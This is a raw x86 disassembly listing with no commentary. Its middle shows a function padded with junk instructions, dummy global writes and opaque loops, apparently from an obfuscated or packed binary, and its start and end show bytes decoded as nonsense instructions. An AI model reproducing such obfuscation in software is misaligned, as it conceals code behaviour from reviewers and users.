  418c30:	jno    0x418bed
  418c32:	in     al,0x46
  418c34:	push   ebp
  418c35:	mov    esi,0x212e0d6d
  418c3a:	adc    esi,DWORD PTR gs:[edi+0x6e]
  418c3e:	jne    0x418c22
  418c40:	aas    
  418c41:	loopne 0x418c5e
  418c43:	cwde   
  418c44:	jecxz  0x418c1d
  418c46:	xor    DWORD PTR [eax],edx
  418c48:	in     eax,0x39
  418c4a:	ret    0x8b1c
  418c4d:	mov    bl,BYTE PTR [esi]
  418c4f:	repz (bad)
  418c52:	repnz mov dl,0xc5
  418c55:	mov    bl,0xb7
  418c57:	(bad)  
  418c58:	xchg   ebx,eax
  418c59:	in     eax,dx
  418c5a:	cwde   
  418c5b:	mov    al,ds:0x10a62d59
  418c60:	clc    
  418c61:	in     eax,0xa1
  418c63:	pop    ebx
  418c64:	xor    BYTE PTR [edx],bh
  418c66:	stos   BYTE PTR es:[edi],al
  418c67:	lahf   
  418c68:	adc    esi,DWORD PTR [esi+edi*1+0x63]
  418c6c:	mov    al,0x46
  418c6e:	popf   
  418c6f:	jmp    0x37e3:0x429df73d
  418c76:	or     BYTE PTR ds:0xb1073866,bh
  418c7c:	push   edi
  418c7d:	lock inc edx
  418c7f:	mov    al,0x29
  418c81:	outs   dx,DWORD PTR ds:[esi]
  418c82:	loop   0x418c41
  418c84:	xor    eax,DWORD PTR [esi]
  418c86:	add    ebx,esp
  418c88:	or     al,dl
  418c8a:	(bad)  
  418c8b:	push   ebp
  418c8c:	jnp    0x418c42
  418c8e:	ins    BYTE PTR es:[edi],dx
  418c8f:	icebp  
  418c90:	repnz into 
  418c92:	xor    edi,DWORD PTR [ebx-0x66d58195]
  418c98:	mov    al,0xb0
  418c9a:	clc    
  418c9b:	xchg   edi,eax
  418c9c:	sub    DWORD PTR [ebp+ecx*4+0x2],edx
  418ca0:	inc    ebx
  418ca1:	mov    dh,0xe6
  418ca3:	in     al,0x9a
  418ca5:	call   0x6fb:0x190b93e5
  418cac:	jge    0x418cd6
  418cae:	sub    al,0x6c
  418cb0:	jbe    0x418d2d
  418cb2:	call   0xd5bd09b4
  418cb7:	sub    ebp,DWORD PTR [ecx]
  418cb9:	mov    cl,BYTE PTR [ecx]
  418cbb:	cmp    DWORD PTR [esi-0x44],ebp
  418cbe:	xchg   esp,eax
  418cbf:	pop    eax
  418cc0:	data16 mov cl,ah
  418cc3:	dec    edi
  418cc4:	or     DWORD PTR [esi],esp
  418cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc7:	or     eax,0x9adc8668
  418ccc:	xlat   BYTE PTR ds:[ebx]
  418ccd:	xor    eax,0xc28150df
  418cd2:	inc    ebp
  418cd3:	jle    0x418c88
  418cd5:	lahf   
  418cd6:	fwait
  418cd7:	out    dx,eax
  418cd8:	fisub  DWORD PTR [eax+0x64]
  418cdb:	cmp    al,0x5b
  418cdd:	jne    0x418c87
  418cdf:	jnp    0x418cbb
  418ce1:	popa   
  418ce2:	pop    esi
  418ce3:	add    al,0xd5
  418ce5:	test   BYTE PTR [ebp+0xf],al
  418ce8:	xchg   esi,eax
  418ce9:	int3   
  418cea:	sbb    ch,BYTE PTR [esi+0x44fe174c]
  418cf0:	sar    ebp,1
  418cf2:	test   eax,0x40532d26
  418cf7:	sub    eax,0x869ec449
  418cfc:	scas   eax,DWORD PTR es:[edi]
  418cfd:	out    dx,eax
  418cfe:	push   0x1e9e70d0
  418d03:	mov    ds:0x8fbd724e,eax
  418d08:	rcl    BYTE PTR [esi-0x73],cl
  418d0b:	lea    ecx,[ecx+ebp*2-0x3b1c86f]
  418d12:	cmp    edi,DWORD PTR [ebx+0xa2ffc72]
  418d18:	pop    ss
  418d19:	sahf   
  418d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d1b:	out    0xcb,eax
  418d1d:	test   DWORD PTR [ebp+0x2],esp
  418d20:	(bad)  
  418d21:	xchg   ecx,eax
  418d22:	adc    eax,0x26672a0b
  418d27:	cmc    
  418d28:	cmp    DWORD PTR [ebp+0x1e],ecx
  418d2b:	push   ebp
  418d2c:	xlat   BYTE PTR ds:[ebx]
  418d2d:	mov    ecx,0x90eafdba
  418d32:	cmp    eax,0x33815e4b
  418d37:	or     DWORD PTR [ebp+0x1f],0xffffff90
  418d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d3c:	xchg   edi,eax
  418d3d:	jle    0x418d1e
  418d3f:	or     edx,DWORD PTR [eax-0x63]
  418d42:	test   BYTE PTR [edi+0x27],cl
  418d45:	pop    esp
  418d46:	les    eax,FWORD PTR [ebp+0x65]
  418d49:	(bad)  
  418d4a:	lods   eax,DWORD PTR ds:[esi]
  418d4b:	jmp    0xd355939a
  418d50:	mov    ecx,0xf10175c
  418d55:	mov    eax,0x65ecff40
  418d5a:	sar    bl,cl
  418d5c:	push   es
  418d5d:	and    edi,ebp
  418d5f:	push   esi
  418d60:	dec    eax
  418d61:	dec    esi
  418d62:	or     eax,0x56f43e5a
  418d67:	out    dx,eax
  418d68:	test   eax,0x6d6b840f
  418d6d:	xchg   ecx,eax
  418d6e:	es out dx,al
  418d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d71:	add    eax,0x88083e9
  418d76:	xor    eax,0x7a09071e
  418d7b:	retf   0x7055
  418d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7f:	cmp    esi,DWORD PTR [ebp+0x5f1b971a]
  418d85:	mov    BYTE PTR [esi],cl
  418d87:	scas   eax,DWORD PTR es:[edi]
  418d88:	lock div DWORD PTR [esi-0x3962d049]
  418d8f:	shl    DWORD PTR ds:0xd57ac3d4,0x84
  418d96:	aam    0x15
  418d98:	das    
  418d99:	pusha  
  418d9a:	std    
  418d9b:	mov    esp,0x83d4d7ef
  418da0:	cmc    
  418da1:	test   DWORD PTR [ecx-0x5a],ebp
  418da4:	test   ecx,0xe26fcada
  418daa:	jo     0x418da5
  418dac:	loope  0x418df2
  418dae:	ja     0x418dc9
  418db0:	or     ebp,eax
  418db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db3:	cli    
  418db4:	push   es
  418db5:	(bad)  
  418db6:	(bad)  
  418db7:	cwde   
  418db8:	mov    ebx,DWORD PTR [eax]
  418dba:	pop    esp
  418dbb:	and    bl,dl
  418dbd:	xchg   ebx,eax
  418dbe:	aaa    
  418dbf:	dec    esp
  418dc0:	mov    ecx,0x37a58441
  418dc5:	(bad)  
  418dc7:	inc    eax
  418dc8:	(bad)  
  418dc9:	imul   ebp,DWORD PTR [ecx+0x72],0xffffffdf
  418dcd:	mov    BYTE PTR [esi+0x56194f00],dl
  418dd3:	daa    
  418dd4:	imul   edx,DWORD PTR [ecx+0xd540750],0xffffffb3
  418ddb:	les    ebx,FWORD PTR [ecx+0x78fe1e92]
  418de1:	shr    BYTE PTR [esi+0x5e],1
  418de4:	jge    0x418d80
  418de6:	dec    ebx
  418de7:	js     0x418d96
  418de9:	std    
  418dea:	jne    0x418e38
  418dec:	pop    edi
  418ded:	mov    eax,ds:0x859420ed
  418df2:	xor    dh,dh
  418df4:	push   es
  418df5:	jnp    0x418dae
  418df7:	outs   dx,BYTE PTR ds:[esi]
  418df8:	sub    BYTE PTR [esi],ch
  418dfa:	(bad)  
  418dfb:	popa   
  418dfc:	mov    dl,0x11
  418dfe:	dec    eax
  418dff:	lock icebp 
  418e01:	push   edx
  418e02:	std    
  418e03:	xor    BYTE PTR [edx],al
  418e05:	dec    eax
  418e06:	or     ah,dh
  418e08:	inc    eax
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x432e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x432e7b,0x432ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x432ec3,0x432e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x432e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x432e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x432e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x432eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x432ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x432e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x432e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x432e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x432e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x432e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x432e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x43fddf
  418ecd:	cmp    DWORD PTR ds:0x432e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x432e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x432e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x432e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x432e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x432e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x432eeb
  418f37:	mov    ebx,DWORD PTR ds:0x432ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x432ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x432ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x432ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4321a7
  418f73:	call   DWORD PTR ds:0x43fde3
  418f79:	cmp    DWORD PTR ds:0x432ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x432ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x432ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x432ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x432ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x432eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x432e37
  419347:	mov    eax,ds:0x432373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x432eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x432eb3
  419365:	inc    eax
  419366:	mov    ds:0x432eb3,eax
  41936b:	cmp    DWORD PTR ds:0x432eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x432eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x43fde7
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x432493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x432e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x432e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x432e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x432e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x432e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x432e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x432e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x432eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x432ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x432e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x432e9f,0x15
  419451:	cmp    DWORD PTR ds:0x432e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x432e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x43fdeb
  419479:	cmp    DWORD PTR ds:0x432e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x432e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x432e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x432e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x432e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x432e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x432e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x432e43,0x432e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x432e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	pop    edi
  41950c:	adc    edi,eax
  41950e:	pop    eax
  41950f:	pop    ebp
